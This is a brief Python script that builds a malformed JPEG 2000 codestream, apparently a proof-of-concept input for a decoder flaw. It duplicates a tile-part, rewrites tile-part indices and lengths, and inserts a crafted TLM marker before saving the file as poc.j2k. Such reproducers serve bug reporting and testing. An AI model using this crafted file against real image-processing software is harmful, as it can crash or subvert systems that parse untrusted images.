from pathlib import Path
import struct, os
Path('/tmp/tiny.pgm').write_bytes(b'P5\n1 1\n255\n\0')

b=Path('/tmp/tiny.j2k').read_bytes()
sot=b.find(b'\xff\x90'); sod=b.find(b'\xff\x93',sot); eoc=b.rfind(b'\xff\xd9')
main=b[:sot]; tp=b[sot:eoc]
print('orig len',len(b),'SOT',sot,'SOD',sod,'tp len',len(tp),tp.hex())
def make_tp(tpno):
    x=bytearray(tp); x[10]=tpno; x[11]=0; x[6:10]=struct.pack('>I', len(x)); return bytes(x)
tp0=make_tp(0); tp1=make_tp(1)
tlm=b'\xff\x55'+struct.pack('>HBBI',7,0,0x40,len(tp0))
poc=main+tlm+tp0+tp1+b'\xff\xd9'
Path('/tmp/poc.j2k').write_bytes(poc)
print('poc len',len(poc),'tlm',tlm.hex())
for i in range(0,len(poc),16): print(f'{i:04x}: '+' '.join(f'{x:02x}' for x in poc[i:i+16]))
